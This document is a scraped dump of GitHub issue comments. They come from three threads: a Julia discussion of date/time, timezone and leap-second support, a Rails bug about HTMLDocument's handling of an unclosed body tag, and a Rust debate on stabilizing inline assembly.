julia/JuliaLang/3524/20196189,"I suspect that ignoring leap seconds might be best since 1) everyone else does it, making compatibility difficult if julia doesn't 2) if people do care about leap seconds, they would probably just use TAI (or have their own special method for dealing with it all) I think the easiest and least confusing solution would be to define a TAI timezone (or a seperate TAI datetime type), and define a method for converting between that and UTC by adding/subtracting the appropriate number of seconds that way, if you want the length of an interval for between  and  (stored in UTC), you could do something like ",,False,False,3524
julia/JuliaLang/3524/20529428,"Ok, I just created new repo with a bunch of stuff I've been working on the last 2 weeks. Basically it ended up being a much larger beast than I anticipated, but that most of you were probably aware of. ) I think it's a really good start though for Date, Periods, TimeZone, and DateTime support in pure Julia.  Here's the repo  main influences for the code are as follows  @friend SimpleDate.jl package @friend Calendar.jl package the R  package Java's Joda-time (which is considered a gold standard across languages even and will soon be merged into core Java)  High-level framework/concepts  a  abstract type to represent a certain calendar's way of date calculations (== chronologies in Joda-time) a  abstract type which is subtyped by all identified zones in the Olson tz database (see ) bits types that represent certain relative/absolute durations of time, including , , , , , and  a  immutable with fields for year, month, and day and is parameterized by a certain  (the  is used by default). This is our ""low-precision"" type that doesn't have to worry about timezones and leap seconds and is easier to reason about in terms of period arithmetic. Similar to a partial datetime or LocalDate in Joda, or a simple Date type in many DBMS. This is very fast to work with doing ranges and arithmetic. a  type that can be used to create frequences given start/period/stop inputs. I think a pure  type could represent Intervals in lubridate/Joda where just a start/stop are given (used with arithmetic, not generating frequencies at all) a 64-bit  bits type that is parameterized by a certain  as well as a . It's value represents the number of Rata Die seconds (seconds since 0000-01-01T000000), similar in concept to a Rata Die day number (see code for more date algorithm comments). Since Unix time's epoch is 62135596860 Rata Die seconds, it's trivial to convert Unix timestamps to  types. Using the current default  though, leap seconds are included (try , so wrapping  in  will give you a DateTime 25 seconds or so in the future. (We could correct this with the  function though to give the true current time that someone sees on the clock).  Potentially useful additions  I mentioned a  type; having a  type would map Intervals in lubridate/Joda; this also open up sub-Second possibilities (having a start  instant and noting the attoseconds from that instant); this stems from a lengthy discussion I found in the forums last year I think a  immutable as 's analogue (field-based with Hour, Minute, Second) would be potentially useful as well I would really love to support Temporal Expressions a la  in Ruby link  This is definitely a first draft, and I'm positive there are holes to be plugged and lots of refinement needed. I would really appreciate any questions, critiques, discussion to push this forward. Sources SimpleDate.jl -  -  -  -  -  Algorithms -  Group Discussion -  convo pull request - ",,False,False,3524
julia/JuliaLang/3524/20559613,"Thanks @friend , this is great. A couple of quick comments while I have more of a play with this  The loading of  seems dependent on the  of the Julia process. May this should be developed as a package intially, and loads made relative to  I assume you have a script to generate the timezone.csv when the Olson db is updated?  This currently seems about two orders of magnitude slower than  for simple data arithmetic.  What is the precision of the  . I personally think that its is fine if very high precision time usage needs specialised libraries, but others may disagree.   ",,False,False,3524
julia/JuliaLang/3524/20559898,"@friend  I've actually pushed a fix for loading , so let me know if you're still seeing a problem there. I'm actually unsatisfied with how the timezone data is handled in general and this was really just a ""get it working first"" kind of solution. I'd love to brainstorm some more ideas of how to be efficient here. Yeah, there's a script to generate the dataset All of the  stuff is definitely slower right now, particularly if you're using non-UTC timezones. Unacceptably slow really. If you're using the lower precision  type though, it should be faster from my initial benchmarks. The  precision is 64-bits with time measured in seconds, so the max date we can show is . This seems well beyond anything anyone should need for timestamps. I agree that for greater precision, an add-on package could provide even more functionality. The discussion here is what spurred my comment about having a possible  64-bit type that could represent a second^10*-p for higher precision intervals. From the discussion, it seems this was following NumPy's approach, but simpler because we could provide one parameterized type as opposed to NumPy's 26 or so new types they introduced for each power of 10. I guess I just am not familiar with actual use-cases enough to know how to best implement something like this or how best to work with this kind of type. Maybe someone who has had experience or is familiar with sub-second timing needs can comment a little more if this is something Julia should provide out of the box or is something better left to a package. I know @friend was involved a lot in that conversation.  ",,False,False,3524
julia/JuliaLang/3524/20704605,"Ok, I added  to METADATA and a README to the package repo, so hopefully more can try it out, kick tires, give it a whirl. I added a  file that runs common operations  times and returns the results. I also included a  file that was my baseline for comparing with the  package. Overall, I'm really pleased with how far the performance has come. @friend's profiler was a great help (and hopefully on windows soon?). Performance-wise,  is either on-par or faster on almost every benchmark. The remaining performance issues are when timezones are specified. I'd say it's at an acceptable/working level (compared to the first draft), but still 2x-4x slower than Calendar.jl. Right now, the timezone data is serialized in matrices for each timezone in the  folder and loaded as the timezone is called for (I like this approach because it manages memory better than slurping the entire db into memory to hold while the user works with timezones). The problem is that with certain timezones, its matrix is 100+ rows and currently, a simple linear search is used to do the lookup. I'm positive some kind of binary/trie/radix/indexed implementation would really help, but I'm actually not very experience with some of these advanced data structures/algorithms to try it out. I'd appreciate anyone's input here. Anyway, it's been a ton of fun working on this stuff and I've really enjoyed how much I've learned about bitstypes and type parameters through the process; it's definitely expanded my understanding on how Julia works and the potential there really is thru the type system. Feedback welcome! ",,False,False,3524
julia/JuliaLang/3524/20723143,"This is really quite amazing. I am a bit taken for the moment, but will certainly jump into this in the next few days. ",,False,False,3524
julia/JuliaLang/3524/21011823,"Vacations are always nice to mull things over. I've thought a lot about the Datetime stuff and particularly about timezone/leap second support and how to do it in a way that's both efficient and maintainable. Here's what I'd like to propose  Including something along the lines of the new Datetime2 package; it includes a simple  and Zulu/UTC-based  implementations (plus support for  types, , , etc.). The code is fast, efficient (~400 lines of code), and provides a lot of date/time functionality without having to deal with any timezone/leap second business. The other main factor here is that this code isn't likely to change (other than normal optimizations, tweaks, etc.).  The creation of a  package (that could possibly live in the JuliaLang organization). This package would include timezone and leap second support similar to what I've pushed in the original  package mentioned earlier in this thread. It would be fully compatible with  code and really just extend it for the additional functionality. The main driving force for splitting this functionality into a separate package that a user would add thru the package manager is maintainability. Leap seconds are announced no more than 6 months before one occurs (either the end of June or end of December). This would fly while Julia is pre-1.0, but imagine if companies are eventually anchoring to v1.0 or v2.0 and new leap seconds are added while a new Julia version is more than 6 months away. It's the same issue with timezone information. The Olson tz database is updated regularly, much more frequently than Julia language releases. Splitting timezone data/functionality into it's own package allows the package to maintain a similar release cadence with Julia, but also include its own ""updates"" to its release branches when they happen, without the fear of breaking user's code.   Feel free to check out the new Datetime2 package (it's really fast!), and I'd love to hear everybody's thoughts on the proposal. ",,False,False,3524
julia/JuliaLang/3524/21013491,"I really appreciate how much thought you've put into this. I think that @friend is the other person here with the most expertise in date and time stuff, and @friend has also done a lot of work on this stuff, so I defer to your collective judgements, but that sounds like a sound plan to me. ",,False,False,3524
julia/JuliaLang/3524/21019382,"I've started using this and think it would be great to have in Base. Getting this finalized will still take some work, but this is very close to the kind of design I'd like to see (as a person without any detailed expertise in time representations). ",,False,False,3524
julia/JuliaLang/3524/21127444,"Neat stuff! I have some reservations about the API, however, in particular the way periods are handled. Eager down-conversion, e.g.,  feels like a mistake. It's an approximation, and it makes period arithmetic non-associative I also don't think splitting the package in two is a great idea. ",,False,False,3524
julia/JuliaLang/3524/21131127,"@friend, can you elaborate more on why you think splitting the package in two is a bad idea? I agree that at first glance, it seems unintuitive and a little weird, but I think the advantages I mentioned in having always-up-to-date timezone/leap second information is a major win. w.r.t timezones, every other major datetime package (Joda, Noda, etc.) ships with a static repo of the timezone data and details a long, complicated download-reformat-recompliation process for manually updating. And for leap seconds, I would argue that we shouldn't support leap seconds in Base under any circumstance. The fact that a new leap second can occur within 6 months would quickly render a static release useless (imagine running a server logging timestamps, expecting leap second support). We'd put ourselves in the same camp as Joda/Noda detailing a manual update process that would surely turn off users. With the package system stabilizing, I think it provides an excellent--and simple--way to provide updates of timezone/leap second data. As for the period arithmetic, I agree that there's a possible gotcha, but there's also not a clear solution without losing some expected behavior or have inconsistencies (e.g. not allow years/months, but allow days). I see a few options  Keep it as is, with default conversions (365 days in a year, etc.) and be upfront/explicit about it and possible gotchas associated with leap years and year + date arithmetic. Note that any  operation already results in an error.  Get rid of inter-period conversions. Then your first example above would calculate the same, but the 2nd, with years(4) + days(1) in parenthesis, would result in an error. Provide a warning/message any time a conversion happens; I initially did this and included months, but it was pretty annoying and probably not a good way to go. Do the same as 2, but also provide a  type (basically a Dict with (Period=&gt;Value), when arithmetic is done, it follows a specific order (greatest to least, first to last, etc.) This is what Noda has done.  ",,False,False,3524
julia/JuliaLang/3524/21143921,"I agree with all of this. But these arguments work equally well with the proposition ""we shouldn't merge Datetime into Base"". Splitting Datetime and merging part of it into Base is liable to create two tightly-coupled modules with different release schedules. So instead, let's not split Datetime up, and leave it as a package. As you say, the package system works great. This is also what Calendar does, so it's the solution i prefer. But if Datetime remains a package, then you're free to implement the solution you prefer. ",,False,False,3524
julia/JuliaLang/3524/21151054,"I think DateTime is important enough that there should be a single canonical implementation. Imagine a system where DataFrames depends on one kind of datetime object, and @friend 's TimeSeries package usage a different type of Date. One would be converting between different types of dates all over one's codebase. This arises  quite often in Java projects, where one dependent library uses JODATime, and another uses java.lang.Date ... (at least there are converters available in this case) While one may make such an argument about any facility, I believe datetimes are fundamental enough that this matters a lot. The best (only?) way of ensuring this is to have a solid date time implementation in Base. ",,False,False,3524
julia/JuliaLang/3524/21155474,"On Jul 17, 2013 253 PM, ""Mike Nolta"" notifications@friend.com wrote two is a bad idea? ... With the package system stabilizing, I think it provides an excellent--and simple--way to provide updates of timezone/leap second data. proposition ""we shouldn't merge Datetime into Base"". two tightly-coupled modules with different release schedules. I'm not sure I follow/understand you here. It would probably be clearer if the DateExtensions package existed already, but what I meant to convey earlier and what I forsee is a tightly controlled interaction between the DateTime module in base and the DateExtensions package. The base module would release along with the rest of Julia base, and the DateExtensions would follow the same schedule for any major updates (though I don't forsee many major updates as it will mainly be a data repo). In between releases, the only updates to the DateExtensions package would be timezone and leap second data additions, which would be entirely non - breaking. Is there some concern or potential misstep I'm missing with this kind of setup? -Jacob So instead, let's not split Datetime up, and leave it as a package. As you say, the package system works great. a Dict with (Period=&gt;Value), when arithmetic is done, it follows a specific order (greatest to least, first to last, etc.) This is what Noda has done. Datetime remains a package, then you're free to implement the solution you prefer. ",,False,False,3524
julia/JuliaLang/3524/21155695,"It seems like the main concern about putting everything in Base is the lack of a good way to update things in a timely manner. Perhaps it's time to think outside of the box; is there any reason we couldn't use the machinery inside of Pkg to provide updates to packages that we could ship with Julia? E.g. something in between Base and ~/.julia? Either something that you can♠usingPkg.add()`, (e.g. a simple package that just comes preinstalled) or something that is automatically used a la Base. But these arguments work equally well with the proposition ""we shouldn't merge Datetime into Base"". I think DateTime is important enough that there should be a single canonical implementation. Imagine a system where DataFrames depends on one kind of datetime object, and @friend  's TimeSeries package usage a different type of Date. One would be converting between different types of dates all over one's codebase. This arises quite often in Java projects, where one dependent library uses JODATime, and another uses java.lang.Date ... (at least there are converters available in this case) While one may make such an argument about any facility, I believe datetimes are fundamental enough that this matters a lot. The best (only?) way of ensuring this is to have a solid date time implementation in Base. — Reply to this email directly or view it on GitHub",,False,False,3524
julia/JuliaLang/3524/21178453,Have some time this week to jump into this conversation. Great stuff. ,,False,False,3524
julia/JuliaLang/3524/21196023,"@friend Thanks for the details. But i read your plan and think, ""This sounds like a hassle. Why bother?"" @friend I don't really buy this argument. There are lots of important packages not in base. If Datetime is high quality, people will use it. If interop becomes a problem, we can ask maintainers to switch. Maybe i'm wrong, but my gut feeling is that the benefit of including this in base is modest at best, and not worth the cost of splitting up the package. ",,False,False,3524
julia/JuliaLang/3524/21198424,"I agree with most of @friend's points. Preventing fracturing of date/time representations is largely a social issue and partly a technical issue of having an official date/time package that's good enough that everyone wants to use it instead of rolling their own. The biggest argument to me for having a time representation in base is that we might want to have functions in base return objects of that type. The  function, for example. But I'm not sure if those should just use float seconds since epoch or whatever. ",,False,False,3524
julia/JuliaLang/3524/21253512,"R has some experience iterating through ways of dealing with time and there is a good man page at  which is pretty long to post here (I'll do it if someone wants it). I think base would be well-served to have at least a foundational time-based type. It can have a timezone field that defaults to  so those data objects that don't need low latency (ie, daily, monthly, yearly) can use it. This time type can then be tagged as an  in a  and will be a path to plotting basic time series. Being able to plot seasonal monthly birth rates from a DataFrame should be available out of the box (base) while those who want more precision and ability to aggregate across specific time periods can access a package. ",,False,False,3524
julia/JuliaLang/3524/21257696,"So after having a go at splitting the  package into two, I have to admit that @friend was right in that it would probably be too much of a hassle. Turns out the actual implementation of having two modules try and be tightly linked is pretty tricky without straight up redefining/overriding exact methods, which doesn't seem like a great user experience (if a workaround to #265 comes about, this could probably be managed). So while splitting the package in two conceptually seems like a great idea for maintainability, practically it doesn't seem to be the best solution. I've merged the revised/enhanced codebase of  into  now and will plan on deleting the  repository. My plan is to keep testing/enhancing  (I actually just pushed temporal expression support which ends up being very natural through using anonymous functions as the ""step"" in a DateRange; see the bottom of the README). I'm happy to help support anything that would like to be included in Base, otherwise,  can continue to be its own package. ",,False,False,3524
julia/JuliaLang/3524/21258764,"@friend @friend  Well, to me the notion of a programming language without date/time support in its standard library seems incomplete. I suppose in the same way a language without BLAS/LAPACK support will seem incomplete to most Julia users. So I would want some kind of date time module in base. But, at the end of day, that's a pretty subjective opinion. ",,False,False,3524
julia/JuliaLang/3524/21264006,"Yes, but things can develop outside and be brought into Base later. ",,False,False,3524
julia/JuliaLang/3524/21267164,"Good point. We haven't gotten beyond 0.2 yet. How about a milestone, say by 0.5? ",,False,False,3524
julia/JuliaLang/3524/23521652,"Re @friend thinking outside the box. If DateTime moves into base, the issues regarding keeping the leap seconds and timezone information up to date come to the forefront.  What if there was a package like , that contained  and a  file, which is installed by default, and possibly auto-updated on julia start (in  by default, so it is easy to turn off?).  That could provide a nice way to keep this information, and possibly other information on a similar release schedule, up to date, and separate from stable code. Or the first call to a function that uses  prints a line warning that it is out of date, sort of like deprecated functions. ",,False,False,3524
julia/JuliaLang/3524/23521877,"@friend, that's a great idea! And we've actually been discussing doing just that over here. I just pushed some changes the other day that should allow us to do this. ",,False,False,3524
julia/JuliaLang/3524/23522597,Auto-updating anything is not ok. You can't start julia and have it make network connections you didn't ask for. In general anything like that should be opt-in not opt-out. ,,False,False,3524
julia/JuliaLang/3524/23522615,I think including the data updates in point releases is probably fine. ,,False,False,3524
julia/JuliaLang/3524/23523054,"Good clarification @friend. Yes, we wouldn't be pushing anything automatically, but it could still be as simple as installing an  package that could be manually updated with  and the timezone/leap second data would refresh. ",,False,False,3524
julia/JuliaLang/3524/49394204,Reopening; this was closed by the accidental bizarro-merge in #7825. ,,False,False,3524
rails/rails/7896/7470893,"HTMLDocument.new(""&lt;body&gt;&lt;br /&gt;"").root.to_s =&gt;  ""&lt;body&gt;&lt;br /&gt;&lt;/body&gt;""  Note that in the above example, the closing \&lt;/body&gt; tag is correctly inferred.  To be consistent, HTMLDocument should behave with HTMLDocument.new(""&lt;body&gt;"").root.to_s =&gt;  ""&lt;body&gt;&lt;/body&gt;""  However, the actual output is &lt;body&gt;  This is the root cause of the fact that testing failed to catch #7894. ",,False,False,7896
rails/rails/7896/9290278,what's this about? Can you add description to this so people can understand what you are talking about? ,,False,False,7896
rails/rails/7896/9303106,"After investigating the issue included with this PR, I saw that  returns invalid html because it does not close the -tag with . ♠&lt;%= form_tag '/posts' %&gt;form_tag` with an empty string though, wouldn't it be better to enforce people passing a block when using this helper? ",,False,False,7896
rails/rails/7896/9308263,"Ayrton,  I came across the bug in #7894 because I was trying to use  without a block, which is not the same as without an action (i.e. '/posts').  It's not for you to judge ""why anyone would want"" to do this--there are legitimate uses, and enforcing that people should only be able to use form_tag in the ways that an individual programmer was able to think up is not a very open-source attitude.  Why should I be limited to generating the form element's children on the server when sometimes it's more practical to use Javascript?  Your comments are not pertinent to this issue and should have been posted on #7894.  If you'd like to begin a discussion there, I'd be happy to explain to you why form_tag should not require a block or an action.   ",,False,False,7896
rails/rails/7896/9317417,Closing this in favor of #7894 ,,False,False,7896
rails/rails/7896/9317864,"vijaydev, could you clarify what ""closing in favor of"" means?  It sounds to me like that means you're not going to pull this fix.  #7894 is a distinct issue.  Fixing it doesn't fix this issue, though fixing this issue makes it possible to test #7894. ",,False,False,7896
rails/rails/7896/9319184,"I mean, let's have one issue/PR where the whole thing is sorted out. You've anyway made a single PR which apparently fixes both issues. ",,False,False,7896
rails/rails/7896/9319304,"Yes, since #7896 blocked testing of #7894 but could be fixed in isolation, I thought it made sense to wrap them in a single PR but two separate commits.  Was that the right move? ",,False,False,7896
rails/rails/7896/9319378,that's fine. ,,False,False,7896
rust/rust-lang/29722/115921650,"This issue tracks stabilization of inline assembly. The current feature has not gone through the RFC process, and will probably need to do so prior to stabilization. ",,False,False,29722
rust/rust-lang/29722/155362102,Will there be any difficulties with ensuring the backward-compatibility of inline assembly in stable code? ,,False,False,29722
rust/rust-lang/29722/207592418,@friend has a great comment at  that I'm reproducing here for posterity ,,False,False,29722
rust/rust-lang/29722/207625252,"I personally think it would be better to do what Microsoft did in MSVC x64 define a (nearly-)comprehensive set of intrinsic functions, for each asm instruction, and do ""inline asm"" exclusively through those intrinsics. Otherwise, it's very difficult to optimize the code surrounding inline asm, which is ironic since many uses of inline asm are intended to be performance optimizations. One advantage of the instrinsic-based approach is that it doesn't need to be an all-or-nothing thing. You can define the most needed intrinsics first, and build the set out incrementally. For example, for crypto, having , . Note that the work to do the instrinsics seems to have been done quite thoroughly already  the intrinsics would be a good idea to add even if it were ultimately decided to support inline asm, as they are much more convenient to use (based on my experience using them in C and C++), so starting with the intrinsics and seeing how far we get seems like a zero-risk-of-being-wrong thing. ",,False,False,29722
rust/rust-lang/29722/207628164,"Intrinsics are good, but  can be used for more than just inserting instructions. For example, see the way I'm generating ELF notes in my  crate.  expect that kind of hackery will be rare, but I think it's still a useful thing to support. ",,False,False,29722
rust/rust-lang/29722/207823543,@friend Inline asm is also useful for code that wants to do its own register/stack allocation (e.g. naked functions). ,,False,False,29722
rust/rust-lang/29722/207841310,@friend yeah those are some excellent reasons to use intrinsics where possible. But it's nice to have inline assembly as the ultimate excape hatch. ,,False,False,29722
rust/rust-lang/29722/207868039,"@friend Note that  is kind of a superset of intrinsics as you can build the latter using the former. (The common argument against this reasoning is that the compiler could theoretically optimize through intrinsics, e.g. hoist them out of loops, run CSE on them, etc. However, it's a pretty strong counterpoint that anyone writing asm for optimization purposes would do a better job at that than the compiler anyways.) See also  and  for cases where inline asm works but intrinsics don't. On the other hand, intrinsics critically depend on a ""sufficiently smart compiler"" to achieve at least the performance one would get with a hand-rolled asm implementation. My knowledge on this is outdated but unless there has been significant progress, intrinsics-based implementations are still measurably inferior in many - if not most - cases. Of course they're much more convenient to use but I'd say that programmers really don't care much about that when they're willing to descend into the world of specific CPU instructions. Now another interesting consideration is that intrinsics could be coupled with fallback code on architectures where they're not supported. This gives you the best of both worlds Your code is still portable - it's can just employ some hardware accelerated operations where the hardware supports them. Of course this only really pays off for either very common instructions or if the application has one obvious target architecture. Now the reason why I'm mentioning this is that while one could argue that this may potentially even be undesirable with compiler-provided intrinsics (as you'd probably care about whether you actually get the accelerated versions plus compiler complexity is never good) I'd say that it's a different story if the intrinsics are provided by a library (and only implemented using inline asm). In fact, this is the big picture I'd prefer even though I can see myself using intrinsics more than inline asm. (I consider the intrinsics from RFC #1199 somewhat orthogonal to this discussion as they exist mostly to make SIMD work.) ",,False,False,29722
rust/rust-lang/29722/220396970,"@friend I'm not sure what you mean here. It's true that the compiler can't break down the asm into its individual operations to do strength reduction or peephole optimizations on it. But in the GCC model, at least, the compiler can allocate the registers it uses, copy it when it replicates code paths, delete it if it's never used, and so on. If the asm isn't volatile, GCC has enough information to treat it like any other opaque operation like, say, . The whole motivation for the weird design is to make inline asm something the optimizer can mess with. But I haven't used it a whole lot, especially not recently. And I have no experience with LLVM's rendition of the feature. So I'm wondering what's changed, or what I've misunderstood all this time. ",,False,False,29722
rust/rust-lang/29722/313146254,"We discussed this issue at the recent work week as @friend's survey of the  ecosystem has the  macro as one of the more commonly used features. Unfortunately we didn't see an easy way forward for stabilizing this feature, but I wanted to jot down the notes we had to ensure we don't forget all this.  First, we don't currently have a great specification of the syntax accepted in the  macro. Right now it typically ends up being ""look at LLVM"" which says ""look at clang"" which says ""look at gcc"" which doesn't have great docs. In the end this typically bottoms out at ""go read someone else's example and adapt it"" or ""read LLVM's source code"". For stabilization a bare minimum is that we need to have a specification of the syntax and documentation.  Right now, as far as we know, there's no stability guarantee from LLVM. The  macro is a direct binding to what LLVM does right now. Does this mean that we can still freely upgrade LLVM when we'd like? Does LLVM guarantee it'll never ever break this syntax? A way to alleviate this concern would be to have our own layer that compiles to LLVM's syntax. That way we can change LLVM whenever we like and if the implementation of inline assembly in LLVM changes we can just update our translation to LLVM's syntax. If  is to become stable we basically need some mechanism of guaranteeing stability in Rust.  Right now there are quite a few bugs related to inline assembly. The A-inline-assembly tag is a good starting point, and it's currently littered with ICEs, segfaults in LLVM, etc. Overall this feature, as implemented today, doesn't seem to live up to the quality guarantees others expect from a stable feature in Rust.  Stabilizing inline assembly may make an implementation of an alternate backend very difficult. For example backends such as miri or cretonne may take a very long time to reach feature parity with the LLVM backend, depending on the implementation. This may mean that there's a smaller slice of what can be done here, but it's something important to keep in mind when considering stabilizing inline assembly.    Despite the issues listed above we wanted to be sure to at least come away with some ability to move this issue forward! To that end we brainstormed a few strategies of how we can nudge inline assembly towards stabilization. The primary way forward would be to investigate what clang does. Presumably clang and C have effectively stable inline assembly syntax and it may be likely that we can just mirror whatever clang does (especially wrt LLVM). It would be great to understand in greater depth how clang implements inline assembly. Does clang have its own translation layer? Does it validate any input parameters? (etc) Another possibility for moving forward is to see if there's an assembler we can just take off the shelf from elsewhere that's already stable. Some ideas here were nasm or the plan9 assembler. Using LLVM's assembler has the same problems about stability guarantees as the inline assembly instruction in the IR. (it's a possibility, but we need a stability guarantee before using it) ",,False,False,29722
rust/rust-lang/29722/313157833,"I would like to point out that LLVM's inline asm syntax is different from the one used by clang/gcc. Differences include  LLVM uses  instead of . LLVM doesn't support named asm operands . LLVM supports different register constraint types for example  instead of  on x86. LLVM support explicit register constraints (). In C you must instead use register asm variables to bind a value to a register (). LLVM  and  constraints are basically broken. Clang translates these into indirect memory constraints  and  and pass the address of the variable to LLVM instead of the variable itself. etc...  Clang will convert inline asm from the gcc format into the LLVM format before passing it on to LLVM. It also performs some validation of the constraints for example it ensures that  operands are compile-time constants,  In light of this I think that we should implement the same translation and validation that clang does and support proper gcc inline asm syntax instead of the weird LLVM one. ",,False,False,29722
rust/rust-lang/29722/315483709,"There's an excellent video about summaries with D, MSVC, gcc, LLVM, and Rust with slides online ",,False,False,29722
rust/rust-lang/29722/316808985,"As someone who'd love to be able to use inline ASM in stable Rust, and with more experience than I want trying to access some of the LLVM MC APIs from Rust, some thoughts  Inline ASM is basically a copy-paste of a snippet of code into the output .s file for assembling, after some string substitution. It also has attachments of input and output registers as well as clobbered registers. This basic framework is unlikely to ever really change in LLVM (although some of the details might vary slightly), and I suspect that this is a fairly framework-independent representation.  Constructing a translation from a Rust-facing specification to an LLVM-facing IR format isn't hard. And it might be advisable--the rust  syntax for formatting doesn't interfere with assembly language, unlike LLVM's  and GCCs  notation.  LLVM does a surprisingly bad job in practice of actually identifying which registers get clobbered, particularly in instructions not generated by LLVM. This means it's pretty much necessary for the user to manually specify which registers get clobbered.  Trying to parse the assembly yourself is likely to be a nightmare. The LLVM-C API doesn't expose the MCAsmParser logic, and these classes are quite annoying to get working with bindgen (I've done it).  For portability to other backends, as long as you keep the inline assembly mostly on the level of ""copy-paste this string with a bit of register allocation and string substitution"", it shouldn't inhibit backends all that much. Dropping the integer constant and memory constraints and keeping just register bank constraints shouldn't pose any problems.   ",,False,False,29722
rust/rust-lang/29722/327399847,"I've been having a bit of play to see what can be done with procedural macros. I've written one that converts GCC style inline assembly to rust style  I've also started working on one that uses a DSL where the user doesn't have to understand the constraints and they're all handled automatically. So I've come to the conclusion that I think rust should just stabilise the bare building blocks, then the community can iterate out of tree with macros to come up with best solutions. Basically, just stabilise the llvm style we have now with only ""r"" and ""i""  and maybe ""m"" constraints, and no clobbers. Other constraints and clobbers can be stabilised later with their own mini rfc type things. ",,False,False,29722
rust/rust-lang/29722/334013222,"Personally I'm starting to feel as though stabilizing this feature is the sort of massive task that will never get done unless somehow someone hires a full-time expert contractor to push on this for a whole year. I want to believe that @friend's suggestion of stabilizing  piecemeal will make this tractable. But if it isn't, then we need to stop trying to reach for the satisfactory solution that will never arrive and reach for the unsatisfactory solution that will stabilize  as-is, warts, ICEs, bugs and all, with bright bold warnings in the docs advertising the jank and nonportability, and with the intent to deprecate someday if a satisfactory implementation should ever miraculously descend, God-sent, on its heavenly host. IOW, we should do exactly what we did for  (and of course, just like for , we can have a brief period of frantic band-aiding and leaky future-proofing). I'm sad at the ramifications for alternative backends, but it's shameful for a systems language to relegate inline assembly to such a limbo, and we can't let the hypothetical possibility of multiple backends continue to obstruct the existence of one actually usable backend. ",,False,False,29722
rust/rust-lang/29722/334027658,"As a data point, I happen to be working on a crate right now that depends on  for the sole purpose of emitting some asm with stable Rust  it certainly has its advantages, I'm a bit wary of the ""stabilize building blocks and leave the rest to proc-macros""-approach. It essentially outsources the design, RFC and implementation process to whoever wants to do the job, potentially no one. Of course having weaker stability/quality guarantees is the entire point (the tradeoff is that having something imperfect is already much better than having nothing at all), I understand that. At least the building blocks should be well-designed - and in my opinion,  definitely isn't. I can't remember ever getting the order right on the first try, I always have to look it up. ""Magic categories separated by colons where you specify constant strings with magic characters that end up doing magic things to the variable names that you also just mash in there somehow"" is just bad. ",,False,False,29722
rust/rust-lang/29722/334134492,"One idea, … Today, there is already a project, named dynasm, which can help you generate assembly code with a plugin used to pre-process the assembly with one flavor of x64 code. This project does not answer the problem of inline assembly, but it can certainly help, if rustc were to provide a way to map variables to registers, and accept to insert set of bytes in the code, such project could also be used to fill-up these set of bytes. This way, the only standardization part needed from rustc point of view, is the ability to inject any byte sequence in the generated code, and to enforce specific register allocations.  This removes all the choice for specific languages flavors. Even without dynasm, this can also be used as a way to make macros for the cpuid / rtdsc instructions, which would just be translated into the raw sequence of bytes. I guess the next question might be if we want to add additional properties/constraints to the byte-sequences. ",,False,False,29722
rust/rust-lang/29722/334237425,"If we want to continue to use LLVM's integrated assembler (I assume this is faster than spawning an external assembler), then stabilization means stabilizing on exactly what LLVM's inline assembly expressions and integrated assembler support&mdash;and compensating for changes to those, should any occur. If we're willing to spawn an external assembler, then we can use any syntax we want, but we're then foregoing the advantages of the integrated assembler, and exposed to changes in whatever external assembler we're calling. ",,False,False,29722
rust/rust-lang/29722/334239773,"I think it would be strange to stabilize on LLVM's format when even Clang doesn't do that.  Presumably it does use LLVM's support internally, but it presents an interface more like GCC. ",,False,False,29722
rust/rust-lang/29722/334352867,"I'm 100% fine with saying ""Rust supports exactly what Clang supports"" and calling it a day, especially since AFAIK Clang's stance is ""Clang supports exactly what GCC supports"". If we ever have a real Rust spec, we can soften the language to ""inline assembly is implementation-defined"". Precedence and de-facto standardization are powerful tools. If we can repurpose Clang's own code for translating GCC syntax to LLVM, all the better. The alternative backend concerns don't go away, but theoretically a Rust frontend to GCC wouldn't be much vexed. Less for us to design, less for us to endlessly bikeshed, less for us to teach, less for us to maintain. ",,False,False,29722
rust/rust-lang/29722/334537584,"If we stabilize something defined in terms of what clang supports, then we should call it . The  name should be reserved for something that's been designed through a full RFC process, like other major Rust features. #bikeshed There are a bunch of things I'd like to see in Rust inline assembly  The template-with-substitutions pattern is ugly. I'm always jumping back and forth between the assembly text and the constraint list. Brevity encourages people to use positional parameters, which makes legibility worse. Symbolic names often mean you have the same name repeated three times in the template, naming the operand, and in the expression being bound to the operand. The slides mentioned in Alex's comment show that D and MSVC let you simply reference variables in the code, which seems much nicer.  Constraints are both hard to understand, and (mostly) redundant with the assembly code. If Rust had an integrated assembler with a sufficiently detailed model of the instructions, it could infer the constraints on the operands, removing a source of error and confusion. If the programmer needs a specific encoding of the instruction, then they would need to supply an explicit constraint, but this would usually not be necessary.   Norman Ramsey and Mary Fernández wrote some papers about the New Jersey Machine Code Toolkit way back when that have excellent ideas for describing assembly/machine language pairs in a compact way. They tackle (Pentium Pro-era) iA-32 instruction encodings; it is not at all limited to neat RISC ISAs. ",,False,False,29722
rust/rust-lang/29722/334544675,"I'd like to reiterate again the conclusions from the most recent work week  Today, as far as we know, there's basically no documentation for this feature. This includes LLVM internals and all. We have, as far as we know, no guarantee of stability from LLVM. For all we know the implementation of inline assembly in LLVM could change any day. This is, currently, a very buggy feature in rustc. It's chock full of (at compile time) segfaults, ICEs, and weird LLVM errors. Without a specification it's nigh impossible to even imagine an alternate backend for this.  To me this is the definition of ""if we stabilize this now we will guarantee to regret it in the future"", and not only ""regret it"" but seems very likely for ""causes serious problems to implement any new system"". At the absolute bare minimum I'd firmly believe that bullet (2) cannot be compromised on (aka the definition of stable in ""stable channel""). The other bullets would be quite sad into forgo as it erodes the expected quality of the Rust compiler which is currently quite high. ",,False,False,29722
rust/rust-lang/29722/334548120,"@friend wrote I would think that, in practice, it would be quite difficult to infer clobber lists. Just because a machine-language fragment uses a register doesn't mean it clobbers it; perhaps it saves it and restores it. Conservative approaches could discourage the code generator from using registers that would be fine to use. ",,False,False,29722
rust/rust-lang/29722/334659265,"@friend wrote The LLVM docs guarantee ""Newer releases can ignore features from older releases, but they cannot miscompile them."" (with respect to IR compatibility). That rather constrains how much they can change inline assembly, and, as I argued above, there's not really any viable replacement at LLVM level that would radically change semantics from the current situation (unlike, say, the ongoing issues around poison and undef). Saying that its prospective instability precludes using it as a base for a Rust  block is therefore somewhat dishonest. Now that's not to say there are other problems with it (poor documentation, although that has improved; constraint suckiness; poor diagnostics; and bugginess in less-common scenarios are ones that come to mind). My biggest worry in reading the thread is that we make the perfect be the enemy of the good. In particular, I worry that searching for some magic DSL intermediary is going to take a few years to try to wrangle into usable form for inline-asm as people discover that integrating asm parsers and trying to get them to work with LLVM's cause more problems in edge cases. ",,False,False,29722
